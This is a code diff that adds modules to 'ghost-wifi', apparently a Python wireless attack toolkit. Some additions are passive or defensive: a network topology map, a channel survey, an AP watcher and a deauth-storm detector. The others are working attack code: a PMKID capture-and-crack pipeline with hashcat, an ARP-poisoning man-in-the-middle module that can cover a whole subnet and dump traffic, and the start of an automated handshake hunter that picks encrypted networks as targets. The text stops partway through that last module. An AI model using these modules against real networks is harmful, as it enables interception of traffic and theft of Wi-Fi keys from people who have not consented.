@@ -36,7 +36,7 @@ R = "\033[91m"; G = "\033[92m"; Y = "\033[93m"
 B = "\033[94m"; M = "\033[95m"; C = "\033[96m"
 W = "\033[97m"; DIM = "\033[2m"; RST = "\033[0m"
 
-VERSAO = "3.1.0"
+VERSAO = "3.2.0"
 
 
 def _build_banner():
@@ -102,7 +102,9 @@ def _build_banner():
         f"{D}wps  evil-twin  crack  wep  clients  karma  auto{X}",
         f"{D}decloak  eapol  signal  handshake  nic-detect  info{X}",
         f"{D}beacon-flood  probe-hunt  mdk4  portal{X}",
-        f"{D}radar  distance{X}",
+        f"{D}radar  distance  wifi-map  channel-survey  ap-watch{X}",
+        f"{D}pcap-analyze  pmkid-crack  deauth-detect  arp-mitm{X}",
+        f"{D}handshake-hunt  dns-spoof{X}",
     ]
 
     out = [f"{Gc}{TL}{eq}{TR}{X}", f"{Gc}{VB}{sp}{VB}{X}"]
@@ -544,8 +546,8 @@ def _signal_bar(pwr_str, width=10):
     return f"{col}{'|' * filled}{DIM}{'.' * (width - filled)}{RST}"
 
 def _print_scan_results(aps, clients, verbose=False):
-    print(f"\n{W}{'BSSID':<19} {'CH':<4} {'SIG':<13} {'ENC':<14} {'VENDOR':<16} {'ESSID'}{RST}")
-    print("-" * 100)
+    print(f"\n{W}{'BSSID':<19} {'CH':<4} {'SIG':<13} {'DIST':<8} {'ENC':<14} {'VENDOR':<16} {'ESSID'}{RST}")
+    print("-" * 108)
     sorted_aps = sorted(aps, key=lambda x: int(x["power"]) if x["power"].lstrip("-").isdigit() else -100, reverse=True)
     for ap in sorted_aps:
         enc = ap["privacy"]
@@ -564,7 +566,16 @@ def _print_scan_results(aps, clients, verbose=False):
         bar = _signal_bar(ap["power"])
         vendor = _oui_vendor(ap["bssid"])[:15]
         pwr_str = f"{ap['power']:>4}dBm" if ap["power"].lstrip("-").isdigit() else f"{ap['power']:>7}"
-        print(f"  {ap['bssid']:<19} {ap['channel']:<4} {bar} {pwr_str:<6} {color}{enc_tag:<14}{RST} {DIM}{vendor:<16}{RST} {hidden}")
+        try:
+            rssi_val = int(ap["power"])
+        except Exception:
+            rssi_val = None
+        ch = ap.get("channel", "6").strip()
+        freq = _FREQ_MAP.get(ch, 2437)
+        d = _rssi_to_distance(rssi_val, freq_mhz=freq) if rssi_val else None
+        dl = _dist_label(d)
+        dc = _dist_color(d)
+        print(f"  {ap['bssid']:<19} {ap['channel']:<4} {bar} {pwr_str:<6} {dc}{dl:<8}{RST} {color}{enc_tag:<14}{RST} {DIM}{vendor:<16}{RST} {hidden}")
 
     if clients:
         print(f"\n{W}{'CLIENT MAC':<19} {'PWR':<5} {'VENDOR':<18} {'ASSOC BSSID':<19} PROBED ESSIDs{RST}")
@@ -2596,6 +2607,949 @@ def cmd_distance(args):
         save_json({"distance_scan": results, "n": n_exp, "tx_ref": tx_ref, "scan_time": datetime.now().isoformat()}, args.output)
 
 
+# ─── Module: wifi-map (topology) ─────────────────────────────────────────────
+
+def cmd_wifi_map(args):
+    if not args.no_banner:
+        print_banner()
+    require_root()
+    require_tool("airodump-ng")
+    mon = args.interface
+    if not mon:
+        mons = get_monitor_interfaces()
+        if not mons:
+            err("No monitor interface. Run: ghost-wifi.py monitor -i wlan0 --action start")
+            sys.exit(1)
+        mon = mons[0]
+
+    duration = args.duration or 20
+    out_prefix = tempfile.mktemp(prefix="/tmp/ghostwifi_map_")
+    band_flag = f"--band {args.band}" if getattr(args, "band", None) else ""
+
+    info(f"Scanning {duration}s on {mon} to build topology map...")
+    proc = subprocess.Popen(
+        f"airodump-ng {mon} {band_flag} --write {out_prefix} --output-format csv -a",
+        shell=True, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL
+    )
+    try:
+        time.sleep(duration)
+    finally:
+        proc.terminate()
+        proc.wait()
+
+    csv_file = f"{out_prefix}-01.csv"
+    if not os.path.exists(csv_file):
+        err("No scan output found.")
+        return
+
+    aps, clients = _parse_airodump_csv(csv_file)
+    for f in Path("/tmp").glob("ghostwifi_map_*"):
+        try: f.unlink()
+        except: pass
+
+    if not aps:
+        warn("No APs found.")
+        return
+
+    # Build AP -> clients mapping
+    ap_map = {ap["bssid"].upper(): ap for ap in aps}
+    ap_clients = {bssid: [] for bssid in ap_map}
+    unassoc = []
+    for cl in clients:
+        bssid = cl["bssid"].strip().upper()
+        if bssid in ap_clients:
+            ap_clients[bssid].append(cl)
+        else:
+            unassoc.append(cl)
+
+    # Sort APs by signal strength
+    sorted_aps = sorted(aps, key=lambda x: int(x["power"]) if x["power"].lstrip("-").isdigit() else -100, reverse=True)
+    top = getattr(args, "top", None)
+    if top:
+        sorted_aps = sorted_aps[:top]
+
+    print()
+    print(f"  {W}GHOST-WIFI TOPOLOGY MAP{RST}  {DIM}({len(aps)} APs, {len(clients)} clients){RST}")
+    print()
+
+    for ap in sorted_aps:
+        bssid = ap["bssid"].upper()
+        essid = ap.get("essid", "").strip() or f"{DIM}[hidden]{RST}"
+        ch = ap.get("channel", "?").strip()
+        enc = ap.get("privacy", "").strip()
+        pwr = ap.get("power", "?").strip()
+        vendor = _oui_vendor(bssid)
+        bar = _signal_bar(pwr, width=8)
+
+        try:
+            rssi_v = int(pwr)
+        except:
+            rssi_v = None
+        d = _rssi_to_distance(rssi_v, freq_mhz=_FREQ_MAP.get(ch, 2437)) if rssi_v else None
+        dl = _dist_label(d)
+        dc = _dist_color(d)
+
+        if "OPN" in enc or enc == "":
+            ec = R
+        elif "SAE" in enc:
+            ec = M
+        elif "WPA" in enc:
+            ec = G
+        else:
+            ec = Y
+
+        print(f"  {G}[AP]{RST} {essid}  {DIM}{bssid}{RST}  ch{ch}  {bar} {pwr}dBm  {dc}{dl}{RST}  {ec}{enc}{RST}  {DIM}{vendor}{RST}")
+
+        cls = ap_clients.get(bssid, [])
+        for i, cl in enumerate(cls):
+            pfx = "  └─" if i == len(cls) - 1 else "  ├─"
+            cl_vendor = _oui_vendor(cl["mac"])
+            probed = cl.get("probed_essids", "").strip()
+            probe_str = f" - probing: {probed[:40]}" if probed else ""
+            print(f"  {pfx} {C}[CLI]{RST} {cl['mac']}  {DIM}{cl_vendor}{probe_str}{RST}")
+
+        if not cls:
+            print(f"  {DIM}  (no clients){RST}")
+
+    if unassoc:
+        print(f"\n  {Y}Unassociated clients:{RST}")
+        for cl in unassoc:
+            cl_vendor = _oui_vendor(cl["mac"])
+            probed = cl.get("probed_essids", "").strip()
+            probe_str = f" searching: {probed[:50]}" if probed else ""
+            print(f"  {DIM}  ?  {cl['mac']}  {cl_vendor}{probe_str}{RST}")
+
+    print()
+    ok(f"Topology: {len(sorted_aps)} APs, {sum(len(v) for v in ap_clients.values())} associated, {len(unassoc)} unassociated clients")
+
+    if args.output:
+        save_json({
+            "topology": [
+                {"ap": ap, "clients": ap_clients.get(ap["bssid"].upper(), [])}
+                for ap in sorted_aps
+            ],
+            "unassociated": unassoc,
+            "scan_time": datetime.now().isoformat()
+        }, args.output)
+
+
+# ─── Module: channel-survey ───────────────────────────────────────────────────
+
+def cmd_channel_survey(args):
+    if not args.no_banner:
+        print_banner()
+    require_root()
+    require_tool("iw")
+    iface = args.interface
+    if not iface:
+        ifaces = get_interfaces()
+        if not ifaces:
+            err("No wireless interface found.")
+            sys.exit(1)
+        iface = ifaces[0]
+
+    info(f"Scanning channels on {iface}...")
+    out, _, _ = run(f"iw dev {iface} scan flush 2>/dev/null", timeout=30)
+
+    # Parse APs per channel
+    channels_24 = {}
+    channels_5 = {}
+    current_freq = None
+    current_signal = -100
+
+    for line in out.splitlines():
+        line = line.strip()
+        m_freq = re.match(r"freq:\s*(\d+)", line)
+        if m_freq:
+            current_freq = int(m_freq.group(1))
+        m_sig = re.match(r"signal:\s*([-\d.]+)", line)
+        if m_sig:
+            current_signal = float(m_sig.group(1))
+        if line.startswith("BSS ") and current_freq:
+            if 2400 <= current_freq <= 2500:
+                # Map freq to channel
+                ch = round((current_freq - 2407) / 5)
+                channels_24[ch] = channels_24.get(ch, []) + [current_signal]
+            elif 5000 <= current_freq <= 5900:
+                ch = round((current_freq - 5000) / 5)
+                channels_5[ch] = channels_5.get(ch, []) + [current_signal]
+            current_freq = None
+            current_signal = -100
+
+    BAR_W = 40
+
+    def _channel_bar(count, max_count):
+        if max_count == 0:
+            return ""
+        filled = max(1, int(count / max_count * BAR_W)) if count else 0
+        if count == 0:
+            return f"{DIM}{'.' * BAR_W}{RST}"
+        col = R if count >= 4 else (Y if count >= 2 else G)
+        return f"{col}{'█' * filled}{DIM}{'.' * (BAR_W - filled)}{RST}"
+
+    print()
+    print(f"  {W}CHANNEL SURVEY{RST}  {DIM}(iface: {iface}){RST}")
+    print()
+
+    if channels_24:
+        print(f"  {C}2.4 GHz Channels:{RST}  {DIM}(non-overlapping: 1, 6, 11){RST}")
+        max_c = max(len(v) for v in channels_24.values()) if channels_24 else 1
+        for ch in sorted(channels_24.keys()):
+            aps = channels_24[ch]
+            bar = _channel_bar(len(aps), max_c)
+            avg_sig = sum(aps) / len(aps) if aps else 0
+            marker = f"{Y} <-- congested{RST}" if len(aps) >= 4 else ""
+            non_overlap = f" {G}[non-overlap]{RST}" if ch in (1, 6, 11) else ""
+            print(f"  CH {ch:>2}  {bar}  {len(aps):>3} APs  avg {avg_sig:>+.0f}dBm{non_overlap}{marker}")
+    else:
+        warn("No 2.4GHz networks found.")
+
+    if channels_5:
+        print()
+        print(f"  {C}5 GHz Channels:{RST}")
+        max_c = max(len(v) for v in channels_5.values()) if channels_5 else 1
+        for ch in sorted(channels_5.keys()):
+            aps = channels_5[ch]
+            bar = _channel_bar(len(aps), max_c)
+            avg_sig = sum(aps) / len(aps) if aps else 0
+            print(f"  CH {ch:>3}  {bar}  {len(aps):>3} APs  avg {avg_sig:>+.0f}dBm")
+
+    print()
+    total = sum(len(v) for v in channels_24.values()) + sum(len(v) for v in channels_5.values())
+    ok(f"Survey: {total} APs found across {len(channels_24)} 2.4GHz + {len(channels_5)} 5GHz channels")
+
+    if args.output:
+        save_json({
+            "2ghz": {str(k): len(v) for k, v in channels_24.items()},
+            "5ghz": {str(k): len(v) for k, v in channels_5.items()},
+            "scan_time": datetime.now().isoformat()
+        }, args.output)
+
+
+# ─── Module: ap-watch ─────────────────────────────────────────────────────────
+
+def cmd_ap_watch(args):
+    if not args.no_banner:
+        print_banner()
+    require_root()
+    require_tool("iw")
+    iface = args.interface
+    if not iface:
+        ifaces = get_interfaces()
+        if ifaces:
+            iface = ifaces[0]
+        else:
+            err("No wireless interface found.")
+            sys.exit(1)
+
+    interval = args.interval or 10
+    bssid_filter = getattr(args, "bssid", None)
+    essid_filter = getattr(args, "essid", None)
+    alert_new = not getattr(args, "gone_only", False)
+    alert_gone = not getattr(args, "new_only", False)
+
+    info(f"Watching for AP changes on {iface} every {interval}s. Ctrl+C to stop.")
+    if bssid_filter:
+        info(f"Filtering BSSID: {bssid_filter}")
+    if essid_filter:
+        info(f"Filtering ESSID: {essid_filter}")
+
+    def _scan_now():
+        seen = {}
+        out, _, _ = run(f"iw dev {iface} scan flush 2>/dev/null", timeout=30)
+        cur_bss = None
+        cur_ssid = ""
+        cur_sig = -100
+        cur_freq = 2437
+        for line in out.splitlines():
+            line = line.strip()
+            m = re.match(r"BSS ([\da-f:]+)", line, re.IGNORECASE)
+            if m:
+                if cur_bss:
+                    seen[cur_bss] = {"essid": cur_ssid, "signal": cur_sig, "freq": cur_freq}
+                cur_bss = m.group(1).upper()
+                cur_ssid = ""
+                cur_sig = -100
+            elif cur_bss:
+                m2 = re.match(r"SSID:\s*(.*)", line)
+                if m2:
+                    cur_ssid = m2.group(1).strip()
+                m3 = re.match(r"signal:\s*([-\d.]+)", line)
+                if m3:
+                    cur_sig = float(m3.group(1))
+                m4 = re.match(r"freq:\s*(\d+)", line)
+                if m4:
+                    cur_freq = int(m4.group(1))
+        if cur_bss:
+            seen[cur_bss] = {"essid": cur_ssid, "signal": cur_sig, "freq": cur_freq}
+        return seen
+
+    def _matches(bssid, ap):
+        if bssid_filter and bssid_filter.upper() not in bssid.upper():
+            return False
+        if essid_filter and essid_filter.lower() not in ap.get("essid", "").lower():
+            return False
+        return True
+
+    known = _scan_now()
+    ok(f"Initial scan: {len(known)} APs visible")
+    events = []
+
+    try:
+        while True:
+            time.sleep(interval)
+            current = _scan_now()
+            ts = datetime.now().strftime("%H:%M:%S")
+
+            for bssid, ap in current.items():
+                if bssid not in known and _matches(bssid, ap) and alert_new:
+                    essid = ap["essid"] or "[hidden]"
+                    dist = _rssi_to_distance(ap["signal"])
+                    dl = _dist_label(dist)
+                    print(f"  {G}[+]{RST} {ts}  {G}NEW AP{RST}  {bssid}  \"{essid}\"  {ap['signal']:.0f}dBm  {dl}")
+                    events.append({"time": ts, "event": "appeared", "bssid": bssid, **ap})
+
+            for bssid, ap in known.items():
+                if bssid not in current and _matches(bssid, ap) and alert_gone:
+                    essid = ap["essid"] or "[hidden]"
+                    print(f"  {R}[-]{RST} {ts}  {R}GONE{RST}   {bssid}  \"{essid}\"  (last: {ap['signal']:.0f}dBm)")
+                    events.append({"time": ts, "event": "disappeared", "bssid": bssid, **ap})
+
+            known = current
+
+    except KeyboardInterrupt:
+        pass
+
+    print()
+    ok(f"Watch ended. {len(events)} events recorded.")
+    if args.output and events:
+        save_json({"events": events}, args.output)
+
+
+# ─── Module: pcap-analyze ─────────────────────────────────────────────────────
+
+def cmd_pcap_analyze(args):
+    if not args.no_banner:
+        print_banner()
+    cap_file = args.cap
+    if not os.path.exists(cap_file):
+        err(f"File not found: {cap_file}")
+        sys.exit(1)
+
+    info(f"Analyzing capture file: {cap_file}")
+    results = {"file": cap_file, "size_kb": round(os.path.getsize(cap_file) / 1024, 1)}
+
+    # Try aircrack-ng handshake check
+    if shutil.which("aircrack-ng"):
+        out, _, _ = run(f"aircrack-ng \"{cap_file}\" 2>&1")
+        results["aircrack_output"] = out[:500]
+        handshakes = re.findall(r"(\d+)\s+handshake", out, re.IGNORECASE)
+        networks = re.findall(r"([\w\s\-_]+)\s+\((\d+)\s+handshake", out, re.IGNORECASE)
+        hs_count = sum(int(h) for h in handshakes) if handshakes else 0
+        results["handshakes"] = hs_count
+        if hs_count > 0:
+            ok(f"Handshakes found: {hs_count}")
+        else:
+            warn("No handshakes found with aircrack-ng")
+
+        # Extract BSSID/ESSID list from aircrack output
+        ap_lines = re.findall(r"([\dA-Fa-f:]{17})\s+.*?\s+(\d+)\s+(\w+)", out)
+        results["networks"] = []
+        for line in out.splitlines():
+            m = re.match(r"\s*\d+\s+([\dA-Fa-f:]{17})\s+(\d+)\s+(\w+)\s+(.+?)\s+(\d+)\s+handshake", line, re.IGNORECASE)
+            if m:
+                results["networks"].append({
+                    "bssid": m.group(1), "beacons": m.group(2),
+                    "data": m.group(3), "essid": m.group(4).strip(),
+                    "handshakes": int(m.group(5))
+                })
+                ok(f"  {m.group(1)}  \"{m.group(4).strip()}\"  {m.group(5)} handshake(s)")
+    else:
+        warn("aircrack-ng not found - skipping handshake check")
+
+    # Try hcxpcapngtool for PMKID
+    if shutil.which("hcxpcapngtool"):
+        tmp_hash = tempfile.mktemp(suffix=".hc22000")
+        out2, _, rc = run(f"hcxpcapngtool -o \"{tmp_hash}\" \"{cap_file}\" 2>&1")
+        if os.path.exists(tmp_hash) and os.path.getsize(tmp_hash) > 0:
+            with open(tmp_hash) as f:
+                hashes = [l.strip() for l in f if l.strip()]
+            pmkid_count = sum(1 for h in hashes if h.split("*")[3] == "0" if len(h.split("*")) > 3)
+            eapol_count = sum(1 for h in hashes if h.split("*")[3] == "1" if len(h.split("*")) > 3)
+            ok(f"hc22000 hashes extracted: {len(hashes)} total (PMKID: {pmkid_count}, EAPOL: {eapol_count})")
+            results["hc22000"] = tmp_hash
+            results["pmkid_count"] = pmkid_count
+            results["eapol_count"] = eapol_count
+        else:
+            warn("No hc22000 hashes extracted")
+            if os.path.exists(tmp_hash):
+                os.unlink(tmp_hash)
+    else:
+        warn("hcxpcapngtool not found - skipping PMKID extraction")
+
+    # tshark stats if available
+    if shutil.which("tshark"):
+        out3, _, _ = run(f"tshark -r \"{cap_file}\" -q -z io,stat,0 2>&1", timeout=20)
+        m_pkts = re.search(r"(\d+)\s+frames", out3)
+        if m_pkts:
+            results["total_frames"] = int(m_pkts.group(1))
+            info(f"Total frames: {m_pkts.group(1)}")
+
+        # Count frame types
+        for ftype, label in [("eapol", "EAPOL"), ("wlan.fc.type_subtype==0x0c", "Deauth"), ("wlan.fc.type_subtype==0x0a", "Disassoc")]:
+            o, _, _ = run(f"tshark -r \"{cap_file}\" -Y \"{ftype}\" -q -z io,stat,0 2>&1", timeout=10)
+            m2 = re.search(r"(\d+)\s+frames", o)
+            if m2:
+                results[label.lower() + "_frames"] = int(m2.group(1))
+                info(f"{label} frames: {m2.group(1)}")
+
+    if args.output:
+        save_json(results, args.output)
+    ok(f"Analysis complete: {cap_file}")
+
+
+# ─── Module: pmkid-crack (all-in-one pipeline) ───────────────────────────────
+
+def cmd_pmkid_crack(args):
+    if not args.no_banner:
+        print_banner()
+    require_root()
+    require_tool("hcxdumptool", "hcxpcapngtool")
+    mon = args.interface
+    if not mon:
+        mons = get_monitor_interfaces()
+        if not mons:
+            err("No monitor interface. Run: ghost-wifi.py monitor -i wlan0 --action start")
+            sys.exit(1)
+        mon = mons[0]
+
+    duration = args.duration or 60
+    bssid = getattr(args, "bssid", None)
+    wordlist = getattr(args, "wordlist", None)
+    out_base = args.output or f"/tmp/pmkid_crack_{int(time.time())}"
+
+    pcapng_file = f"{out_base}.pcapng"
+    hash_file = f"{out_base}.hc22000"
+
+    # Step 1: capture
+    bssid_flag = f"--filterlist_ap={bssid} --filtermode=2" if bssid else ""
+    info(f"[1/3] Capturing PMKID on {mon} for {duration}s...")
+    if bssid:
+        info(f"      Targeting BSSID: {bssid}")
+    proc = subprocess.Popen(
+        f"hcxdumptool -i {mon} -o \"{pcapng_file}\" {bssid_flag} --active_beacon",
+        shell=True, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL
+    )
+    try:
+        time.sleep(duration)
+    finally:
+        proc.terminate()
+        proc.wait()
+
+    if not os.path.exists(pcapng_file) or os.path.getsize(pcapng_file) == 0:
+        err(f"No capture output at {pcapng_file}")
+        return
+
+    ok(f"Capture done: {os.path.getsize(pcapng_file) // 1024}KB")
+
+    # Step 2: convert
+    info(f"[2/3] Converting to hashcat format...")
+    out, _, rc = run(f"hcxpcapngtool -o \"{hash_file}\" \"{pcapng_file}\" 2>&1")
+    if not os.path.exists(hash_file) or os.path.getsize(hash_file) == 0:
+        err("No hashes extracted. No PMKID/EAPOL handshakes captured.")
+        warn("Try increasing duration or move closer to the AP.")
+        return
+
+    with open(hash_file) as f:
+        hash_lines = [l.strip() for l in f if l.strip()]
+    ok(f"Extracted {len(hash_lines)} hash(es) -> {hash_file}")
+
+    for h in hash_lines[:5]:
+        parts = h.split("*")
+        if len(parts) >= 4:
+            htype = "PMKID" if parts[3] == "0" else "EAPOL"
+            info(f"  {htype}: ...{h[40:60]}...")
+
+    # Step 3: crack
+    if not wordlist and not shutil.which("hashcat"):
+        warn("No wordlist specified and hashcat not found. Hashes saved, crack manually:")
+        warn(f"  hashcat -m 22000 {hash_file} /path/to/wordlist.txt")
+        return
+
+    if not wordlist:
+        warn("No --wordlist specified. Hashes saved. Crack manually:")
+        warn(f"  hashcat -m 22000 {hash_file} /usr/share/wordlists/rockyou.txt")
+        return
+
+    info(f"[3/3] Cracking with hashcat (mode 22000)...")
+    out3, _, rc3 = run(f"hashcat -m 22000 \"{hash_file}\" \"{wordlist}\" --status --potfile-disable 2>&1", timeout=0)
+    cracked = re.findall(r"([\dA-Fa-f:]{17})::([^:]+):([^:]+):([^:]+):[^:]+:(\S+)", out3)
+    if cracked:
+        for c in cracked:
+            ok(f"CRACKED! BSSID: {c[1]}  KEY: {c[4]}")
+    else:
+        # Check potfile / output
+        m_key = re.search(r"WPA \*\d+\* (.+)", out3)
+        if m_key:
+            ok(f"Key found: {m_key.group(1)}")
+        else:
+            warn("No key found in wordlist. Try a larger wordlist.")
+    print(out3[-800:] if len(out3) > 800 else out3)
+
+
+# ─── Module: deauth-detect ────────────────────────────────────────────────────
+
+def cmd_deauth_detect(args):
+    if not args.no_banner:
+        print_banner()
+    require_root()
+    require_tool("airodump-ng")
+    mon = args.interface
+    if not mon:
+        mons = get_monitor_interfaces()
+        if not mons:
+            err("No monitor interface. Run: ghost-wifi.py monitor -i wlan0 --action start")
+            sys.exit(1)
+        mon = mons[0]
+
+    threshold = getattr(args, "threshold", 5)
+    duration = args.duration or 0  # 0 = run until Ctrl+C
+    out_prefix = tempfile.mktemp(prefix="/tmp/ghostwifi_ddet_")
+
+    info(f"Monitoring for deauth attacks on {mon} (threshold: {threshold}/s). Ctrl+C to stop.")
+    warn("This detects deauth storms - 802.11 frame type 0x0c / subtype 12")
+
+    # Use airodump-ng to dump frames and monitor deauth via tshark/tcpdump side channel
+    # Primary: use airodump-ng csv + check IV spikes as proxy
+    # Better: use tshark if available to filter deauth frames
+
+    if shutil.which("tshark"):
+        info("Using tshark for precise deauth frame detection...")
+        deauth_counts = {}
+        events = []
+
+        cmd_str = f"tshark -i {mon} -Y 'wlan.fc.type_subtype==0x0c || wlan.fc.type_subtype==0x0a' -T fields -e wlan.sa -e wlan.da -e wlan.bssid -l 2>/dev/null"
+        proc = subprocess.Popen(cmd_str, shell=True, stdout=subprocess.PIPE, stderr=subprocess.DEVNULL, text=True)
+
+        window_start = time.time()
+        window_frames = []
+        deadline = time.time() + duration if duration else None
+
+        try:
+            for line in proc.stdout:
+                line = line.strip()
+                if not line:
+                    continue
+                parts = line.split("\t")
+                if len(parts) >= 2:
+                    src = parts[0].upper()
+                    dst = parts[1].upper() if len(parts) > 1 else "?"
+                    bssid = parts[2].upper() if len(parts) > 2 else src
+                    ts = datetime.now().strftime("%H:%M:%S")
+                    window_frames.append((time.time(), src, dst, bssid))
+
+                    # Slide 1-second window
+                    now = time.time()
+                    window_frames = [f for f in window_frames if now - f[0] < 1.0]
+                    rate = len(window_frames)
+
+                    if rate >= threshold:
+                        attackers = {}
+                        for _, s, d, b in window_frames:
+                            attackers[s] = attackers.get(s, 0) + 1
+                        top_attacker = max(attackers, key=attackers.get)
+                        print(f"  {R}[!]{RST} {ts}  {R}DEAUTH STORM{RST}  {rate}/s  from {top_attacker}  bssid {bssid}")
+                        events.append({"time": ts, "rate": rate, "src": top_attacker, "bssid": bssid})
+                    else:
+                        print(f"\r  {C}[*]{RST} {ts}  Deauth frames/s: {rate:<4}", end="", flush=True)
+
+                if deadline and time.time() > deadline:
+                    break
+        except KeyboardInterrupt:
+            pass
+        finally:
+            proc.terminate()
+    else:
+        # Fallback: watch airodump-ng CSV for high-rate IV changes (proxy for deauth-associated activity)
+        warn("tshark not found. Using airodump-ng proxy detection (less precise).")
+        proc = subprocess.Popen(
+            f"airodump-ng {mon} --write {out_prefix} --output-format csv -a",
+            shell=True, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL
+        )
+        csv_file = f"{out_prefix}-01.csv"
+        prev_ivs = {}
+        events = []
+
+        try:
+            deadline = time.time() + duration if duration else None
+            while True:
+                time.sleep(2)
+                if not os.path.exists(csv_file):
+                    continue
+                aps, _ = _parse_airodump_csv(csv_file)
+                ts = datetime.now().strftime("%H:%M:%S")
+                for ap in aps:
+                    bssid = ap["bssid"].upper()
+                    try:
+                        iv = int(ap.get("iv", 0))
+                    except:
+                        iv = 0
+                    prev = prev_ivs.get(bssid, iv)
+                    rate = (iv - prev) / 2
+                    if rate > 50:
+                        warn(f"  {ts}  High IV rate on {bssid} ({ap.get('essid','?')}): {rate:.0f}/s - possible deauth activity")
+                        events.append({"time": ts, "bssid": bssid, "iv_rate": rate})
+                    prev_ivs[bssid] = iv
+                if deadline and time.time() > deadline:
+                    break
+        except KeyboardInterrupt:
+            pass
+        finally:
+            proc.terminate()
+            proc.wait()
+            for f in Path("/tmp").glob("ghostwifi_ddet_*"):
+                try: f.unlink()
+                except: pass
+
+    print()
+    ok(f"Detection ended. {len(events)} deauth storm events detected.")
+    if args.output and events:
+        save_json({"events": events}, args.output)
+
+
+# ─── Module: arp-mitm ─────────────────────────────────────────────────────────
+
+def cmd_arp_mitm(args):
+    if not args.no_banner:
+        print_banner()
+    require_root()
+    require_tool("arpspoof")
+
+    target_ip = args.target
+    gateway_ip = args.gateway
+    iface = args.interface
+
+    if not iface:
+        out, _, _ = run("ip route show default 2>/dev/null")
+        m = re.search(r"dev (\S+)", out)
+        iface = m.group(1) if m else None
+        if not iface:
+            err("Could not detect default interface. Use -i/--interface.")
+            sys.exit(1)
+        info(f"Using interface: {iface}")
+
+    if not gateway_ip:
+        out, _, _ = run("ip route show default 2>/dev/null")
+        m = re.search(r"default via (\S+)", out)
+        gateway_ip = m.group(1) if m else None
+        if not gateway_ip:
+            err("Could not detect gateway. Use --gateway.")
+            sys.exit(1)
+        info(f"Detected gateway: {gateway_ip}")
+
+    info(f"Starting ARP MITM: {target_ip} <-> {gateway_ip} on {iface}")
+    warn("This positions you between the target and gateway (man-in-the-middle).")
+    warn("Requires authorized testing environment.")
+
+    # Enable IP forwarding
+    run("echo 1 > /proc/sys/net/ipv4/ip_forward")
+    ok("IP forwarding enabled")
+
+    # Optional iptables capture
+    if getattr(args, "capture_port", None):
+        port = args.capture_port
+        run(f"iptables -t nat -A PREROUTING -p tcp --dport {port} -j REDIRECT --to-port {port}")
+        info(f"iptables redirect: port {port} traffic captured")
+
+    # Start arpspoof in both directions
+    procs = []
+    if target_ip:
+        p1 = subprocess.Popen(
+            f"arpspoof -i {iface} -t {target_ip} {gateway_ip}",
+            shell=True, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL
+        )
+        p2 = subprocess.Popen(
+            f"arpspoof -i {iface} -t {gateway_ip} {target_ip}",
+            shell=True, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL
+        )
+        procs = [p1, p2]
+        ok(f"ARP poisoning running: {target_ip} <-MITM-> {gateway_ip}")
+    else:
+        # Poison entire subnet
+        p1 = subprocess.Popen(
+            f"arpspoof -i {iface} {gateway_ip}",
+            shell=True, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL
+        )
+        procs = [p1]
+        ok(f"ARP poisoning entire subnet via {gateway_ip}")
+
+    info("MITM active. Use Wireshark/tcpdump to capture traffic. Ctrl+C to stop.")
+
+    if getattr(args, "dump", False) and shutil.which("tcpdump"):
+        dump_file = args.output or f"/tmp/mitm_capture_{int(time.time())}.pcap"
+        info(f"Dumping traffic to {dump_file}...")
+        p_dump = subprocess.Popen(
+            f"tcpdump -i {iface} -w \"{dump_file}\" -s 0 2>/dev/null",
+            shell=True
+        )
+        procs.append(p_dump)
+
+    try:
+        while True:
+            time.sleep(1)
+    except KeyboardInterrupt:
+        pass
+    finally:
+        for p in procs:
+            try:
+                p.terminate()
+                p.wait()
+            except:
+                pass
+        # Restore ARP
+        if target_ip and gateway_ip:
+            run(f"arp -s {target_ip} $(arp -n {target_ip} | awk '{{print $3}}' | tail -1) 2>/dev/null")
+        run("echo 0 > /proc/sys/net/ipv4/ip_forward")
+        ok("IP forwarding disabled. ARP tables will recover.")
+
+
+# ─── Module: handshake-hunt ───────────────────────────────────────────────────
+
+def cmd_handshake_hunt(args):
+    if not args.no_banner:
+        print_banner()
+    require_root()
+    require_tool("airodump-ng", "aireplay-ng")
+    mon = args.interface
+    if not mon:
+        mons = get_monitor_interfaces()
+        if not mons:
+            err("No monitor interface.")
+            sys.exit(1)
+        mon = mons[0]
+
+    scan_duration = getattr(args, "scan_duration", 20)
+    capture_per_ap = getattr(args, "capture_timeout", 30)
+    max_targets = getattr(args, "max_targets", 5)
+    enc_filter = getattr(args, "enc_filter", None)
+    min_signal = getattr(args, "min_signal", -80)
+    out_dir = args.output or "/tmp/ghost_hunt"
+
+    os.makedirs(out_dir, exist_ok=True)
+
+    # Phase 1: scan
+    info(f"[1/3] Scanning {scan_duration}s for targets on {mon}...")
+    scan_prefix = tempfile.mktemp(prefix="/tmp/ghostwifi_hunt_")
+    proc = subprocess.Popen(
+        f"airodump-ng {mon} --write {scan_prefix} --output-format csv -a",
+        shell=True, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL
+    )
+    try:
+        time.sleep(scan_duration)
+    finally:
+        proc.terminate()
+        proc.wait()
+
+    csv_file = f"{scan_prefix}-01.csv"
+    if not os.path.exists(csv_file):
+        err("Scan failed.")
+        return
+
+    aps, _ = _parse_airodump_csv(csv_file)
+    for f in Path("/tmp").glob("ghostwifi_hunt_*"):
+        try: f.unlink()
+        except: pass
+
+    # Filter and prioritize
+    targets = []
+    for ap in aps:
+        try:
+            sig = int(ap["power"])
+        except:
+            sig = -100
+        enc = ap.get("privacy", "")
+        if sig < min_signal:
+            continue
+        if enc_filter and enc_filter.upper() not in enc.upper():
+            continue
+        if "OPN" in enc or enc.strip() == "":
+            continue  # skip open networks
+        targets.append(ap)
+
+    # Sort by signal strength
+    targets.sort(key=lambda x: int(x["power"]) if x["power"].lstrip("-").isdigit() else -100, reverse=True)
+    targets = targets[:max_targets]
+
+    if not targets:
+        warn("No suitable targets found.")
+        info(f"Criteria: signal >= {min_signal}dBm, encrypted")
+        return
+
+    info(f"[2/3] Selected {len(targets)} target(s):")
+    for i, ap in enumerate(targets, 1):
+        info(f"  {i}. {ap['bssid']}  ch{ap['channel']}  {ap['power']}dBm  \"{ap.get('essid','[hidden]')}\"  {ap['privacy']}")
+
+    # Phase 2: hunt handshakes
+    captured = []
+    info(f"[3/3] Hunting handshakes ({capture_per_ap}s per target)...")
+
+    for ap in targets:
+        bssid = ap["bssid"]
